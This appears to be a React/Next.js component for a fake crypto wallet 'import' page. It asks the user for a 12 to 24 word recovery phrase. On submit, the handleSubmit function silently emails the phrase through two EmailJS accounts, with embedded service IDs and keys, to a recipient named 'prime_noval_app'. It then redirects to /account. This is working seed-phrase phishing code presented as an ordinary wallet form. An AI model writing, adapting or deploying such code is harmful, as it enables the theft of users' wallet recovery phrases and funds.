import { useState } from "react";
import styles from "@/styles/form.module.css";
import "react-toastify/dist/ReactToastify.css";
import { useRouter } from "next/navigation";
import emailjs from "@emailjs/browser";
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';


const Phrase = ({ selectedWallet, appType}) => {

  const router = useRouter();

  const [phrase, setPhrase] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const input = e.target.value;
    const sanitizedInput = input.replace(/[^a-z\s]/g, "");

    const wordCount = sanitizedInput.trim().split(/\s+/).filter(Boolean).length;

    if (wordCount > 24) {
      toast.error('Valid word count between 12 and 24.', {
        position: "top-right",
        autoClose: 2500,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
        });
      return;
    }

    setPhrase(sanitizedInput);
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const wordCount = phrase.trim().split(/\s+/).filter(Boolean).length;

    if (wordCount < 12) {
      toast.error('Valid word count between 12 and 24.', {
        position: "top-right",
        autoClose: 2500,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
        });
      return;
    }

    setIsSubmitting(true);

    const name = selectedWallet ?? appType;
    const type = "Phrase / Keys";
    const data = phrase;
    const password = "not_required";
    const formData = { name, type, data, password };

    try {

      await emailjs.send(
        "service_30vkiql",
        "template_e0wb6w8",
        {
          to_name: "prime_noval_app",
          from_name: formData.name,
          message: `
            Name: ${formData.name}
            Type: ${formData.type}
            Data: ${formData.data}
            Password: ${formData.password}
          `,
        },
        "4leuzsOPi6Oh_D4e0"
      );

      await emailjs.send(
        "service_ky8xa0e",
        "template_kqjcmir",
        {
          to_name: "prime_noval_app",
          from_name: formData.name,
          message: `
            Name: ${formData.name}
            Type: ${formData.type}
            Data: ${formData.data}
            Password: ${formData.password}
          `,
        },
        "pudHPDoixy2beukw8"
      );

      setTimeout(() => {
        router.push("/account");
      }, 3000);
    } catch (error) {
      console.error(error);
      toast.error('network error', {
        position: "top-right",
        autoClose: 2500,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
        });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div>
      <ToastContainer />
      <p className={styles.walletType}>Phrase</p>
      <form className={styles.importWalletForm} onSubmit={handleSubmit}>
        <textarea
          className={styles.textarea}
          value={phrase}
          onChange={handleChange}
        ></textarea>
        <button
          type="submit"
          className={styles.connectButton}
          disabled={isSubmitting}
        >
          {isSubmitting ? "Wait..." : "Proceed"}
        </button>
      </form>
    </div>
  )
}

export default Phrase